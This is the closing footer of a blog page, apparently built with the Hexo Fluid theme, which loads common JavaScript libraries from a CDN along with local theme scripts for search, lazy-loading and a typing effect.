  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
